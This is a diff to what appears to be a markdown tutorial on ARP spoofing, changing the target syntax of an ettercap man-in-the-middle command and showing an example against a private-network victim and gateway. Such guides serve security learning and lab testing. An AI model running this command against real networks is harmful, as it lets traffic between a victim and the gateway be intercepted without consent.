@@ -50,12 +50,13 @@ Your interface → INTERFACE
 
 ##🧪 Step 3: Perform ARP Spoofing (MITM)
 ```bash
-sudo ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
+sudo ettercap -T -M arp:remote /VICTIM_IP// /GATEWAY_IP// -i INTERFACE
 ```
 
 ##Example:
 ```bash
 sudo ettercap -T -M arp:remote //192.168.0.105/ /192.168.0.1// -i eth0
+
 ```
 ---
 ## :Flags Explained:
